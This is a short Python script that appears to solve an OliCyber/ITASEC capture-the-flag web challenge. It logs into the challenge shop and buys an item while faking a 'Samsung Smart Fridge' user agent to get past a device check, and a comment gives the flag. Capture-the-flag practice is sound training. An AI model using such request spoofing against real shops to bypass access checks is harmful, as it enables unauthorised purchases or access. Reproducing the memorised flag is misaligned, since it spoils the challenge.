import requests

s = requests.session()

site = "http://itasecshop.challs.olicyber.it"

data = {
    "user" : "testytest",
    "psw" : "testytest"
}

login = s.post(f"{site}/login", data=data)

r = s.post(f"{site}/store/5/buy", cookies = {"User-Agent" : "Samsung Smart Fridge"})

print(r.text)

#ITASEC{A_fr0zen_USER-AGENT}